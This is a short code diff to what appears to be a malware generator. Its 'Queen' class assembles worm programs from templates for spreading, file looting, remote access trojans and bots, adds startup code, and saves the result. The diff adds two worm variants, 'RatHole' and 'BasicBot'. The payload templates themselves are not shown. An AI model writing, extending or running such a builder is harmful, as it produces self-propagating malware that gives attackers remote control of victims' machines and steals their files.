@@ -70,5 +70,10 @@ class Queen:
         elif types == "GypsyKing":
             b = self.load_temp("adv_worm.py")
             c = self.render_template("looter.py", {"LOOTER_DIR": conf["LOOTER_DIR"], "LOOTER_EXT" : conf["LOOTER_EXT"]})
+        elif types == "RatHole":
+            b = self.load_temp("adv_worm.py")
+            c = self.load_temp("rat.py")
+        elif types == "BasicBot":
+            b = self.load_temp("basbot.py")
         fcode = cham + a + b + c + d + startup
         self.save_worm(conf["NAME"], conf["WORM_TYPE"], fcode)
